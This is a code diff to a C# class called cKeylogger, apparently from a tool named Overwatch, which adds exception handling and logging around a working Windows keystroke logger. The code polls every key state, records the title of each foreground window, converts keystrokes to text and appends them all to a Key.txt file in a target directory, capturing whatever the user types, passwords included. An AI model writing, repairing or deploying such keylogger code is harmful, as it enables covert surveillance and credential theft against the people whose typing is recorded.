@@ -8,6 +8,7 @@ namespace Overwatch
 {
     class cKeylogger
     {
+        static appLog Log = new appLog();
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
         [DllImport("user32.dll")]
@@ -27,66 +28,70 @@ namespace Overwatch
         private const bool DEBUG = true;
         internal void Start()
         {
-            string path = appConfing.targetDirPath+"\\Key.txt";
-            using (StreamWriter writer = new StreamWriter(path, true))
+            try
             {
-                string tempWindowText, lastWindowText = "";
-                while (true)
+                string path = appConfing.targetDirPath + "\\Key.txt";
+                using (StreamWriter writer = new StreamWriter(path, true))
                 {
-                    for (Int32 i = 0; i < 1000; i++)
+                    string tempWindowText, lastWindowText = "";
+                    while (true)
                     {
-                        tempWindowText = getCurrentWindowText();
-                        if (lastWindowText != tempWindowText)
+                        for (Int32 i = 0; i < 1000; i++)
                         {
-                            lastWindowText = tempWindowText;
-                            writer.Write("BEGIN WINDOW: " + lastWindowText + "\n");
-                        }
-                        int value = GetAsyncKeyState(i);
-                        if ((value & 0x8000) == 0 || (value & 0x1) == 0)
-                            continue;
-                        Keys key = (Keys)i;
-                        switch (key)
-                        {
-                            case Keys.LButton:
-                            case Keys.MButton:
-                            case Keys.RButton:
-                            case Keys.Back:
-                            case Keys.ShiftKey:
-                            case Keys.Shift:
-                            case Keys.LShiftKey:
-                            case Keys.RShiftKey:
-                            case Keys.Capital:
-                                writer.Write(" [" + key.ToString() + "] ");
-                                break;
-                            case Keys.Enter:
-                                writer.Write("\n");
-                                break;
-                            case Keys.Space:
-                                writer.Write(" ");
-                                break;
-                            case Keys.Tab:
-                                writer.Write("\t");
-                                break;
-                            case Keys.Escape:
-                                writer.Write(" ");
-                                break;
-                            default:
-                                IntPtr hWindowHandle = GetForegroundWindow();
-                                uint dwThreadId = GetWindowThreadProcessId(hWindowHandle, out uint dwProcessId);
-                                byte[] kState = new byte[256];
-                                GetKeyboardState(kState); //retrieves the status of all virtual keys
-                                uint HKL = GetKeyboardLayout(dwThreadId); //retrieves the input locale identifier
-                                StringBuilder keyName = new StringBuilder();
-                                ToUnicodeEx((uint)i, (uint)i, kState, keyName, 16, 0, HKL);
-                                writer.Write(keyName.ToString());
-                                break;
-                        }
+                            tempWindowText = getCurrentWindowText();
+                            if (lastWindowText != tempWindowText)
+                            {
+                                lastWindowText = tempWindowText;
+                                writer.Write("BEGIN WINDOW: " + lastWindowText + "\n");
+                            }
+                            int value = GetAsyncKeyState(i);
+                            if ((value & 0x8000) == 0 || (value & 0x1) == 0)
+                                continue;
+                            Keys key = (Keys)i;
+                            switch (key)
+                            {
+                                case Keys.LButton:
+                                case Keys.MButton:
+                                case Keys.RButton:
+                                case Keys.Back:
+                                case Keys.ShiftKey:
+                                case Keys.Shift:
+                                case Keys.LShiftKey:
+                                case Keys.RShiftKey:
+                                case Keys.Capital:
+                                    writer.Write(" [" + key.ToString() + "] ");
+                                    break;
+                                case Keys.Enter:
+                                    writer.Write("\n");
+                                    break;
+                                case Keys.Space:
+                                    writer.Write(" ");
+                                    break;
+                                case Keys.Tab:
+                                    writer.Write("\t");
+                                    break;
+                                case Keys.Escape:
+                                    writer.Write(" ");
+                                    break;
+                                default:
+                                    IntPtr hWindowHandle = GetForegroundWindow();
+                                    uint dwThreadId = GetWindowThreadProcessId(hWindowHandle, out uint dwProcessId);
+                                    byte[] kState = new byte[256];
+                                    GetKeyboardState(kState); //retrieves the status of all virtual keys
+                                    uint HKL = GetKeyboardLayout(dwThreadId); //retrieves the input locale identifier
+                                    StringBuilder keyName = new StringBuilder();
+                                    ToUnicodeEx((uint)i, (uint)i, kState, keyName, 16, 0, HKL);
+                                    writer.Write(keyName.ToString());
+                                    break;
+                            }
 
+                        }
+                        writer.Flush();
+                        System.Threading.Thread.Sleep(25);
                     }
-                    writer.Flush();
-                    System.Threading.Thread.Sleep(25);
                 }
             }
+            catch (Exception ex) { Log.Write(ex.Message, true); }
         }
 
         private string getCurrentWindowText()
